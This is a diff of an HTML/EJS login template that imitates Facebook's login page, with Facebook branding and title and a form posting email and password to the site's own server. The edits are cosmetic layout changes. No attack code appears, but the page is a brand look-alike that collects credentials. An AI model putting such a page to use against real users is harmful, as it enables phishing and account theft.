@@ -3,9 +3,13 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="shortcut icon" href="/images/Facebook-logo.png"  type="image/png">
-    <title>Facebook</title>
-    <link rel="stylesheet" href="login.css" />
+    <link
+      rel="shortcut icon"
+      href="/images/Facebook-logo.png"
+      type="image/png"
+    />
+    <title>facebook - log in or sign up</title>
+    <link rel="stylesheet" href="/styles/login.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
@@ -25,13 +29,11 @@
         </section>
 
         <section class="right-section container">
-          <h2 class="logo-title"></h2>
-
           <div class="logo-wrapper">
             <svg
               xmlns="http://www.w3.org/2000/svg"
               fill="currentColor"
-              class="facebook logo-title"
+              class="facebook-logo logo-title"
               viewBox="0 0 16 16"
             >
               <path
@@ -41,11 +43,19 @@
           </div>
 
           <form action="/" method="post">
+            
             <input
               type="text"
               name="email"
               placeholder="Mobile Number or email address"
-            /><br /><br />
+            />
+
+            <section class="Error">
+              <% if(typeof error!=='undefined') {%>
+              <span><%=error%></span>
+              <%}%>
+            </section>
+            <br />
 
             <input
               type="password"
@@ -56,21 +66,10 @@
             <div class="btn-container">
               <button type="submit" class="btn">Log In</button>
 
-              <section class="Error">
-                <% if(typeof error!=='undefined') {%>
-                <span><%=error%></span>
-                <%}%>
-              </section>
-
               <a
                 href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMxODAzNTI5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next"
                 >Forget Password?</a
               >
-            </div>
-
-            <div class="create-account-option">
-              <hr />
-              <hr />
             </div>
 
             <div class="create-account-wrapper">
